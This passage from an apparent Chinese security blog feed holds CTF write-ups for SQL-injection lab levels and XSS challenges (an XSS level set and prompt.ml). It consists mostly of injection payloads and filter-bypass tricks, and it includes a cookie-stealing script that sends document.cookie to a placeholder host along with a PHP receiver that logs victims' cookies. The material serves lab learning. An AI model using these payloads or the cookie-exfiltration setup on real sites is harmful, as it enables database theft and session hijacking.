        <content type="html"><![CDATA[<h2 id="第一关-GET-Error-based-Single-quotes"><a href="#第一关-GET-Error-based-Single-quotes" class="headerlink" title="第一关 GET Error based- Single quotes"></a>第一关 GET Error based- Single quotes</h2><p>payload</p><pre><code>http://localhost/Less-1/?id=1&#39; order by 3 -- +</code></pre><p><img src="/posts/70df97a2/1581060199563.png" alt></p><p>(火狐不知道为什么感觉有bug)</p><p>在确定回显的时候，要注意去查一个不存在的数据</p><pre><code>http://localhost/Less-1/?id=888&#39; union select 1,2,3 --+</code></pre><h2 id="第二关-GET-Error-based-Intiger"><a href="#第二关-GET-Error-based-Intiger" class="headerlink" title="第二关 GET Error based-Intiger"></a>第二关 GET Error based-Intiger</h2><p>没有单引号保护</p><pre><code>http://localhost/Less-2/?id=12312 union select 1,2,3 #</code></pre><p><img src="/posts/70df97a2/1581060927106.png" alt></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>加了括号保护</p><pre><code class="sql">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre><pre><code>http://localhost/Less-3/?id=22333&#39; ) union select 1,2,3 --+</code></pre><p><img src="/posts/70df97a2/1581061220464.png" alt></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>双引号保护</p><pre><code>http://localhost/Less-4/?id=1111&quot;) union select 1,2,3--+</code></pre><p><img src="/posts/70df97a2/1581061432798.png" alt></p><h2 id="第五关-Double-injection-Single-Quotes"><a href="#第五关-Double-injection-Single-Quotes" class="headerlink" title="第五关  Double injection-Single Quotes"></a>第五关  Double injection-Single Quotes</h2><p>这里理解一下报错注入</p><pre><code class="sql">select count(*),(concat(floor(rand(0)*2),(select version())))x from users group by x</code></pre><p><code>floor(rand(0)*2)</code> 产生的数据很有规律</p><pre><code>mysql&gt; select floor(rand(0)*2) from users;+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 |+------------------+0110 1100</code></pre><p>再看 <code>group by</code></p><p>首先计算第一次 <code>group by</code> 后面的字段值，然后去查找有没有，没有就需要插入，插入的时候需要再计算一次</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考</a></p><p>在第三次插入的时候出问题</p><p>最后的payload</p><pre><code>http://localhost/Less-5/?id=2&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581062957254.png" alt></p><p>数据库也可以这样查</p><pre><code class="sql">mysql&gt; select group_concat(schema_name) from information_schema.schemata;+--------------------------------------------------------------------------------------------------------------------------------+| group_concat(schema_name)                                                                                                      |+--------------------------------------------------------------------------------------------------------------------------------+| information_schema,challenges,ctf,dvwa,ed01,mysql,newdb,performance_schema,reservation,security,sys,test,tptest,typecho,xinxiu |+--------------------------------------------------------------------------------------------------------------------------------+1 row in set</code></pre><p>简单一点的 payload</p><pre><code>http://localhost/Less-5/?id=1&#39; and (select 1 from (select count(*),  concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x )a) --+</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>同第五关类似</p><pre><code>http://localhost/Less-6/?id=2&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581063846151.png" alt></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>是写shell，但是我没有成功(其实是因为mysql开了权限吧估计)</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注(多加一些括号)</p><pre><code class="sql">http://localhost/Less-8/?id=1&#39; and (select ascii(mid((select database()), 1,1)))=115 --+</code></pre><p><img src="/posts/70df97a2/1581064726062.png" alt></p><h2 id="第九关-延时注入"><a href="#第九关-延时注入" class="headerlink" title="第九关 延时注入"></a>第九关 延时注入</h2><p>延时注入</p><pre><code class="sql">http://localhost/Less-9/?id=1&#39; and (select  if(ascii(substr(database(),1,1))&gt;200 , sleep(5), NULL) ) --+</code></pre><p><img src="/posts/70df97a2/1581065698494.png" alt></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>延时注入，只是换成了双引号</p><pre><code class="sql">http://localhost/Less-10/?id=1&quot; and (select if( ascii(substr(database(),1,1)) &gt; 40, sleep(5), NULL)) --+</code></pre><p><img src="/posts/70df97a2/1581065865089.png" alt></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>POST形式的单引号</p><pre><code>uname=&amp;passwd=admin&#39; union select 1,2-- +&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079686829.png" alt></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>POST形式的双引号</p><p>payload(这次测试发现 <code>--+</code> 不行，需要换成 #)</p><pre><code>uname=a&amp;passwd=admin&quot;) union select 1,2# &amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079951209.png" alt></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>有报错回显，但是并没有其他的数据回显</p><p><img src="/posts/70df97a2/1581080112218.png" alt></p><p>payload(遇到困难加括号就行了)</p><pre><code>uname=admin&amp;passwd=admin&#39;) and (select 1 from (select count(*), concat(floor(rand(0)*2),(select database()))x from information_schema.tables group by x)a)  #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581080519639.png" alt></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>同上一关类似</p><pre><code>uname=admin&amp;passwd=admin&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x  from information_schema.tables group by x)a)# &amp;submit=Submit</code></pre><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>延时注入,注意只能用 <code>#</code> 注释？</p><pre><code class="sql">uname=admin&amp;passwd=admin &#39; and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081075376.png" alt="明显看到延时"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>同十五关</p><pre><code>uname=admin&amp;passwd=admin&quot;) and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081206257.png" alt></p><h2 id="第十七关-报错注入"><a href="#第十七关-报错注入" class="headerlink" title="第十七关 报错注入"></a>第十七关 报错注入</h2><p>update形式的注入，这里可以使用 报错注入</p><pre><code>uname=admin&amp;passwd=admin&#39;  and (updatexml(1,concat(0x3a,(select database())),1)) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081624347.png" alt></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>payload</p><pre><code class="sql">User-Agent: 1&#39; or updatexml(1,concat(0x3a,(database())),0),&#39;&#39;,&#39;&#39;)#</code></pre><p><img src="/posts/70df97a2/1581082594671.png" alt></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>payload</p><pre><code>Referer:  1&#39; or updatexml(1,concat(0x3a,(database())),0), &#39;&#39;)#</code></pre><p>INSERT 形式的注入</p><p><img src="/posts/70df97a2/1581083050547.png" alt></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>cookie形式的报错注入</p><pre><code class="sql">admin&#39; and (updatexml(1,concat(0x3a,(select database())),1)) # </code></pre><p><img src="/posts/70df97a2/1581124084727.png" alt></p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p>需要base64编码</p><pre><code>admin&#39; ) and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>编码之后</p><pre><code>YWRtaW4nICkgYW5kICh1cGRhdGV4bWwoMSwgY29uY2F0KDB4M2EsIChzZWxlY3QgZGF0YWJhc2UoKSksMHgzYSApICwxKSkgIw==</code></pre><p><img src="/posts/70df97a2/1581124754782.png" alt></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>改成了双引号闭合</p><pre><code>admin&quot; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>base64编码之后</p><pre><code>YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsIGNvbmNhdCgweDNhLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4M2EgKSAsMSkpICM=</code></pre><p><img src="/posts/70df97a2/1581137685241.png" alt></p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p>这一次把注释符过滤了</p><p><img src="/posts/70df97a2/1581137728016.png" alt></p><pre><code class="php">$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code></pre><p>报错注入可以</p><pre><code>http://localhost/Less-23/?id=1&#39; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) and &#39;1&#39; =&#39;1</code></pre><p><img src="/posts/70df97a2/1581137879879.png" alt></p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p>二次注入，注册一个用户名 <code>admin &#39;#</code> 就可以修改admin的密码了</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p>过滤了 <code>and</code> 和 <code>or</code> ，</p><p>可以双写绕过或者使用 <code>&amp;&amp;</code> 和 <code>||</code></p><p><img src="/posts/70df97a2/1581138060996.png" alt></p><p><img src="/posts/70df97a2/1581138112434.png" alt></p><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><p>类似的过滤了and和or，而且没有单引号保护，双写绕过</p><p><img src="/posts/70df97a2/1581139222272.png" alt></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习记录</title>
      <link href="/posts/88edfa78/"/>
      <url>/posts/88edfa78/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><pre><code> http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><pre><code> 没有找到和&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;相关的结果.</code></pre><p>但是</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;scRipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scRipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt;</code></pre><p>payload</p><pre><code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>那就不用</p><pre><code> &#39;onmouseover=&#39;alert(1)</code></pre><p>提交之后鼠标悬浮到上面即可触发</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>同样的绕过</p><pre><code> &quot; onmouseover=&quot;alert(1)</code></pre><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>但是现在会被过滤</p><pre><code>&lt;input name=keyword  value=&quot;&#39;o_nmouseover=&#39;alert(1)&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>那么事件不能用了</p><p>payload</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;</code></pre><p><img src="/posts/88edfa78/1581324449393.png" alt="img"></p><pre><code> &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;img sr_c=x o_nerror=alert(1)&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;       &lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(1);&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>payload：(大写可以绕过)</p><pre><code> &quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</code></pre><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><pre><code> &lt;form action=level7.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p><code>script</code> , <code>on</code>被过滤</p><p>payload</p><pre><code> &quot; oonninput=alert(1) &quot; &quot;oonnmouseover=&quot;alert(1)</code></pre><p>然后输入即可</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p><pre><code> javascript:alert(1) </code></pre><p>html实体编码，然后加上 <code>%0d</code></p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp://www.0aa.me%0dalert(1)</code></pre><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p><pre><code> &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p><pre><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><p><img src="/posts/88edfa78/1582880021264.png" alt="img"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p><pre><code> &lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;</code></pre><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p><pre><code> http://localhost/xss_test/level15.php?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p><pre><code> http://localhost/xss_test/level16.php?keyword=%3Cimg%0asrc=1%0aonerror=alert(1)%3E</code></pre><p>level17-20 都是flash相关的xss，就不写了</p><h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><pre><code> &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></pre><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre><code> function escape(input) {     // tags stripping mechanism from ExtJS library     // Ext.util.Format.stripTags     var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;     input = input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;; }        </code></pre><p>不能闭合标签</p><pre><code> &lt;body/onload=prompt(1)// &lt;body onload=prompt(1)//</code></pre><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code> function escape(input) {     //                      v-- frowny face     input = input.replace(/[=(]/g, &#39;&#39;);      // ok seriously, disallows equal signs and open parenthesis     return input; }        </code></pre><p>使用svg即可</p><pre><code> &lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code> function escape(input) {     // filter potential comment end delimiters     input = input.replace(/-&gt;/g, &#39;_&#39;);      // comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; }        </code></pre><p>新姿势get</p><pre><code> --!&gt;&lt;script&gt;prompt(1)&lt;/script</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>function escape(input) {    // make sure the script belongs to own site    // sample script: http://prompt.ml/js/test.js    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {        var script = document.createElement(&#39;script&#39;);        script.src = input;        return script.outerHTML;    } else {        return &#39;Invalid resource.&#39;;    }}        </code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>function escape(input) {    // apply strict filter rules of level 0    // filter &quot;&gt;&quot; and event handlers    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;}      </code></pre><p>新姿势。。</p><pre><code>&quot;type=image src onerror=&quot;prompt(1)</code></pre><p>或者</p><pre><code>&quot;type=image src onerror=prompt(1) </code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code> function escape(input) {     // let&#39;s do a post redirection     try {         // pass in formURL#formDataJSON         // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}         var segments = input.split(&#39;#&#39;);         var formURL = segments[0];         var formData = JSON.parse(segments[1]);          var form = document.createElement(&#39;form&#39;);         form.action = formURL;         form.method = &#39;post&#39;;          for (var i in formData) {             var input = form.appendChild(document.createElement(&#39;input&#39;));             input.name = i;             input.setAttribute(&#39;value&#39;, formData[i]);         }          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     // forbid javascript: or vbscript: and data: stuff    \n\     if (!/script:|data:/i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;/script&gt;                                                 \n\         &#39;;     } catch (e) {         return &#39;Invalid form data.&#39;;     } }      </code></pre><p>代码很复杂，但是其实就是一个构造表单的过程</p><p><img src="/posts/88edfa78/1582896974234.png" alt="img"></p><p>如果使用JavaScript伪协议，被过滤了</p><pre><code> javascript:prompt(1)#{&quot;test&quot;:1}</code></pre><p>新姿势：</p><p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p><p>所以如果输入</p><pre><code> javascript:prompt(1)#{&quot;action&quot;:1}</code></pre><p>得到的结果</p><pre><code> &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;1&quot;&gt;&lt;/form&gt;                          &lt;script&gt;                                                       // forbid javascript: or vbscript: and data: stuff         if (!/script:|data:/i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;/script&gt;     </code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code> function escape(input) {     // filter potential start-tags     input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);     // use all-caps for heading     input = input.toUpperCase();      // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;; }     </code></pre><p>payload如下</p><pre><code> &lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</code></pre><p><img src="/posts/88edfa78/1582897922738.png" alt="img"></p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><pre><code> function escape(input) {     // (╯°□°）╯︵ ┻━┻     input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);     // ┬──┬ •ノ( ゜-゜ノ) chill out bro     input = input.replace(/&#39;/g, &#39;&#39;);      // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;; }        </code></pre><p>组合一下。</p><pre><code> prom&#39;pt(1)</code></pre><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p>常用的payload</p><pre><code> &lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句  &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;a href = javasript:alert(1)&gt;</code></pre><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p><pre><code> var img = document.createElement(&quot;img&quot;); img.src = &quot;http://xxx/x.php?cookie=&quot;+document.cookie; document.body.appendChild(img);</code></pre><p>接收端</p><pre><code> &lt;?php   $victim = &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile = fopen(&quot;/aixi/XSS/xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</code></pre><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p><pre><code> &lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code></pre><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p><pre><code> &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</code></pre><p>所以我们需要修改成这样</p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></pre><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p><pre><code>&lt;img src=&quot;1&quot; onerror=&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;&gt;</code></pre><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p><pre><code>&lt;img src = &quot;https://text.com&quot; onclick = &#39;alert(输入点)&#39;&gt;</code></pre><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p><p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p><pre><code>&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</code></pre><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p><p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p><h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><pre><code>&lt;a href = &quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</code></pre><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p><p>于是我们可以反过来编码</p><p>作为攻击者我们应该反过来首先进行一个JS编码</p><pre><code> &lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>然后进行一个URL编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>最后进行一个HTML编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>其他栗子：</p><pre><code> &lt;a 